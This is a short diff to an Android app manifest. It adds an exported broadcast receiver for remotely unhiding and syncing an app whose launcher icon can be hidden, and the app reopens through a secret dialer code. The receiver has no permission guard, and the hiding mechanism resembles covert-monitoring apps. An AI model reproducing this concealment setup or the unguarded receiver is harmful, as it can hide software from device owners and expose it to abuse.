@@ -61,6 +61,16 @@
             </intent-filter>
         </activity>
 
+        <!-- Admin Receiver for remote/local app unhide & restoration -->
+        <receiver
+            android:name=".AdminReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.CallVia360.app.ACTION_UNHIDE" />
+                <action android:name="com.CallVia360.app.ACTION_SYNC" />
+            </intent-filter>
+        </receiver>
+
         <!-- Secret code dialer receiver: Dial *#*#3600#*#* to open app when launcher icon is hidden -->
         <receiver
             android:name=".SecretCodeReceiver"
